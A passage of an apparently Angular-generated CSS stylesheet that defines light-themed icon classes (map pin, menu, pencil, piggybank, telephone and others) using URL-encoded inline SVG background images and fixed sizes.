      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_mappin%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C17c0%2C4.73-8%2C14.9-8%2C14.9S13%2C21.73%2C13%2C17a7.81%2C7.81%2C0%2C0%2C1%2C8-8%2C7.81%2C7.81%2C0%2C0%2C1%2C8%2C8m2%2C0a10%2C10%2C0%2C0%2C0-20%2C0c0%2C5.52%2C10%2C18%2C10%2C18S31%2C22.52%2C31%2C17m-6%2C0a4%2C4%2C0%2C1%2C1-4-4%2C4%2C4%2C0%2C0%2C1%2C4%2C4m2%2C0a6%2C6%2C0%2C1%2C0-6%2C6%2C6%2C6%2C0%2C0%2C0%2C6-6%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-menu-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_menu%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C15H31v2H11Zm0%2C12H31V25H11Zm0-5H31V20H11Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-minus-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_minus%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2210%2021%2029%2021%2030%2021%2030%2019%2010%2019%2010%2021%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-mobile-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Csvg%20width%3D%2240px%22%20height%3D%2240px%22%20viewBox%3D%220%200%2040%2040%22%20version%3D%221.1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E%0A%20%20%20%20%3C!--%20Generator%3A%20Sketch%2053.1%20%2872631%29%20-%20https%3A%2F%2Fsketchapp.com%20--%3E%0A%20%20%20%20%3Ctitle%3E055-mobile-white-circle%3C%2Ftitle%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C%2Fdesc%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22path-1%22%20cx%3D%2219%22%20cy%3D%2219%22%20r%3D%2219%22%3E%3C%2Fcircle%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M7%2C5%20L7%2C3.5%20C7%2C2.671%207.671%2C2%208.5%2C2%20L17.5%2C2%20C18.328%2C2%2019%2C2.671%2019%2C3.5%20L19%2C5%20L7%2C5%20Z%20M7%2C20%20L19%2C20%20L19%2C6%20L7%2C6%20L7%2C20%20Z%20M19%2C22.5%20C19%2C23.328%2018.328%2C24%2017.5%2C24%20L8.5%2C24%20C7.671%2C24%207%2C23.328%207%2C22.5%20L7%2C21%20L19%2C21%20L19%2C22.5%20Z%20M17.5%2C1%20L8.5%2C1%20C7.119%2C1%206%2C2.119%206%2C3.5%20L6%2C5%20L6%2C6%20L6%2C20%20L6%2C21%20L6%2C22.5%20C6%2C23.881%207.119%2C25%208.5%2C25%20L17.5%2C25%20C18.881%2C25%2020%2C23.881%2020%2C22.5%20L20%2C21%20L20%2C20%20L20%2C6%20L20%2C5%20L20%2C3.5%20C20%2C2.119%2018.881%2C1%2017.5%2C1%20L17.5%2C1%20Z%22%20id%3D%22path-3%22%3E%3C%2Fpath%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20id%3D%22Symbols%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F01-template%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F02-circle%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Circle%22%20transform%3D%22translate%281.000000%2C%201.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-2%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-1%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Mask%22%20fill-rule%3D%22nonzero%22%3E%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fwhite%22%20mask%3D%22url%28%23mask-2%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28-1.000000%2C%20-1.000000%29%22%20id%3D%22Color-%2F-White%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2240%22%20height%3D%2240%22%3E%3C%2Frect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2212-mobile%2F055-mobile%22%20transform%3D%22translate%287.000000%2C%207.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-4%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-3%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20id%3D%22Mask%22%20fill%3D%22%23046EAE%22%20fill-rule%3D%22evenodd%22%20xlink%3Ahref%3D%22%23path-3%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fb1%22%20mask%3D%22url%28%23mask-4%29%22%20fill%3D%22%23002A54%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Color-%2F-B1%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2226%22%20height%3D%2226%22%3E%3C%2Frect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-pencil-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_pencil%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27%2C25.89l2-1.06V29a4%2C4%2C0%2C0%2C1-4%2C4H13a4%2C4%2C0%2C0%2C1-4-4V13a4%2C4%2C0%2C0%2C1%2C4-4H25a4%2C4%2C0%2C0%2C1%2C3.86%2C3.31L27%2C13.3V13a2%2C2%2C0%2C0%2C0-2-2H13a2%2C2%2C0%2C0%2C0-2%2C2V29a2%2C2%2C0%2C0%2C0%2C2%2C2H25a2%2C2%2C0%2C0%2C0%2C2-2Zm11.14-8L20%2C27.51H14.1l-1-1.88%2C3.25-4.82%2C0-.06L34.55%2C11.1ZM19.91%2C21.14l1.72%2C3.24%2C9.25-4.92-1.72-3.24Zm-.4%2C4.37.36-.19-1.72-3.24-.36.19L15.6%2C25.51ZM35.44%2C17%2C33.72%2C13.8l-2.8%2C1.49%2C1.72%2C3.24Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-people-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_people%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M28%2C19a5%2C5%2C0%2C1%2C0-5-5A5%2C5%2C0%2C0%2C0%2C28%2C19Zm0-8a3%2C3%2C0%2C1%2C1-3%2C3A3%2C3%2C0%2C0%2C1%2C28%2C11ZM14%2C19a5%2C5%2C0%2C1%2C0-5-5A5%2C5%2C0%2C0%2C0%2C14%2C19Zm0-8a3%2C3%2C0%2C1%2C1-3%2C3A3%2C3%2C0%2C0%2C1%2C14%2C11Zm.77%2C10.43A3.9%2C3.9%2C0%2C0%2C0%2C13%2C21a4%2C4%2C0%2C0%2C0-4%2C4H9v8H21V24.72l-6.19-3.29ZM19%2C31H11V25h0a2%2C2%2C0%2C0%2C1%2C2-2%2C3.51%2C3.51%2C0%2C0%2C1%2C1%2C.27l5%2C2.66Zm14-6h0v8H23V31h8V25a2%2C2%2C0%2C0%2C0-2-2%2C2%2C2%2C0%2C0%2C0-1%2C.3v0l-5%2C2.66V23.66l4.19-2.23A7.37%2C7.37%2C0%2C0%2C1%2C29%2C21%2C4%2C4%2C0%2C0%2C1%2C33%2C25Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-piggybank-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_piggybank%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M25.74%2C18.37A5.55%2C5.55%2C0%2C0%2C0%2C22%2C17a5.62%2C5.62%2C0%2C0%2C0-3.62%2C1.25l-1.83-1a7.66%2C7.66%2C0%2C0%2C1%2C11%2C.12ZM32.36%2C17A7.5%2C7.5%2C0%2C0%2C1%2C33%2C20a8.38%2C8.38%2C0%2C0%2C1-4%2C6.87V31H15V26.87A9.22%2C9.22%2C0%2C0%2C1%2C11.7%2C23H9V17h2.72A8.41%2C8.41%2C0%2C0%2C1%2C13%2C15V9h2l4.36%2C2.28A12.69%2C12.69%2C0%2C0%2C1%2C22%2C11a11.68%2C11.68%2C0%2C0%2C1%2C9.36%2C4.28l1.4-.74.94%2C1.76ZM31%2C20c0-3.87-4-7-9-7a11.24%2C11.24%2C0%2C0%2C0-2.88.39L15%2C11.26v4.37A6.39%2C6.39%2C0%2C0%2C0%2C13.13%2C19H11v2h2.13A7.12%2C7.12%2C0%2C0%2C0%2C17%2C25.76V29h4V27h2v2h4V25.76C29.36%2C24.5%2C31%2C22.39%2C31%2C20Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-playbutton-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_play_button%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C11H13a6%2C6%2C0%2C0%2C0-6%2C6v8a6%2C6%2C0%2C0%2C0%2C6%2C6H29a6%2C6%2C0%2C0%2C0%2C6-6V17A6%2C6%2C0%2C0%2C0%2C29%2C11Zm4%2C14.19A4%2C4%2C0%2C0%2C1%2C29.2%2C29H12.81A4%2C4%2C0%2C0%2C1%2C9%2C25.19V16.81A4%2C4%2C0%2C0%2C1%2C12.81%2C13H29.2A4%2C4%2C0%2C0%2C1%2C33%2C16.81ZM18%2C26.34a1%2C1%2C0%2C0%2C1-1-1V16.66a1%2C1%2C0%2C0%2C1%2C.48-.86%2C1%2C1%2C0%2C0%2C1%2C1%2C0l8.17%2C4.33a1%2C1%2C0%2C0%2C1%2C0%2C1.77l-8.17%2C4.34A1%2C1%2C0%2C0%2C1%2C18%2C26.34Zm1-8v5.35L24%2C21Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-plus-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_plus%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2230%2019%2021%2019%2021%2010%2019%2010%2019%2019%2010%2019%2010%2021%2019%2021%2019%2030%2021%2030%2021%2021%2030%2021%2030%2019%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-print-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_print%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C19h2v2H29Zm6%2C0v8H29v4H13V27H7V19a4%2C4%2C0%2C0%2C1%2C4-4h2V9H29v6h2A4%2C4%2C0%2C0%2C1%2C35%2C19ZM15%2C15H27V11H15Zm0%2C14H27V23H15Zm18-8V19a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2v6h4V21H29v4h4Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-profile-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_profile%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M25%2C17a4%2C4%2C0%2C1%2C1-4-4%2C4%2C4%2C0%2C0%2C1%2C4%2C4m2%2C0a6%2C6%2C0%2C1%2C0-6%2C6%2C6%2C6%2C0%2C0%2C0%2C6-6m-6%2C7.39L9.36%2C30.58l.94%2C1.77L21%2C26.66l10.7%2C5.69.94-1.77Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-search-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_search%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M23%2C9a8%2C8%2C0%2C0%2C0-4.6%2C14.53L13%2C33.7l1.77.94%2C5.41-10.18A8%2C8%2C0%2C1%2C0%2C23%2C9Zm0%2C14a6%2C6%2C0%2C1%2C1%2C6-6A6%2C6%2C0%2C0%2C1%2C23%2C23Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-shopping-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_shopping_cart%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C33a2%2C2%2C0%2C1%2C1-2-2A2%2C2%2C0%2C0%2C1%2C29%2C33ZM17%2C31a2%2C2%2C0%2C1%2C0%2C2%2C2A2%2C2%2C0%2C0%2C0%2C17%2C31ZM31%2C15v6h0l-7.58%2C4v0H13a2%2C2%2C0%2C0%2C0%2C2%2C2H29v2H15a4%2C4%2C0%2C0%2C1-4-4V15H7V13h6v2Zm-2%2C2H13v6H23l6-3.2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-talk-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_talk%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31%2C19c0%2C3-2%2C5.51-5%2C6.89l-9%2C4.78V26.27c-3.52-1.24-6-4-6-7.27%2C0-4.42%2C4.48-8%2C10-8s10%2C3.58%2C10%2C8m2%2C0c0-5.52-5.37-10-12-10S9%2C13.48%2C9%2C19c0%2C3.69%2C2.42%2C6.88%2C6%2C8.6V34l12.94-6.88h0A9.54%2C9.54%2C0%2C0%2C0%2C33%2C19%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-telephone-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_telephone%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31.11%2C31.49l-3.75-7.06-4.54%2C0-3.64-6.84%2C2.49-3.69L18%2C6.76h0L14.44%2C8.64h0A6%2C6%2C0%2C0%2C0%2C12%2C16.76h0l7.51%2C14.13h0a6%2C6%2C0%2C0%2C0%2C8.11%2C2.48h0l3.53-1.88Zm-4.47.11h0a4%2C4%2C0%2C0%2C1-5.41-1.65L13.72%2C15.82a4%2C4%2C0%2C0%2C1%2C1.65-5.41h0l1.77-.94%2C2.24%2C4.21-2.53%2C3.75h0l4.79%2C9h4.5l2.27%2C4.26-1.76.94Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-tiles-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_tiles%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M13%2C9a4%2C4%2C0%2C0%2C0-4%2C3.83H9V19H19V9Zm4%2C8H11V13a2%2C2%2C0%2C0%2C1%2C2-2h4Zm16-4a4%2C4%2C0%2C0%2C0-4-4H23V19H33V13Zm-2%2C4H25V11h4a2%2C2%2C0%2C0%2C1%2C2%2C2ZM9%2C23v6a4%2C4%2C0%2C0%2C0%2C4%2C4h6V23Zm8%2C8H13a2%2C2%2C0%2C0%2C1-2-2V25h6Zm6-8V33h6a4%2C4%2C0%2C0%2C0%2C4-4V23Zm6%2C8H25V25h6v4A2%2C2%2C0%2C0%2C1%2C29%2C31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-upload-light[_ngcontent-yta-c101] {
      background-image: 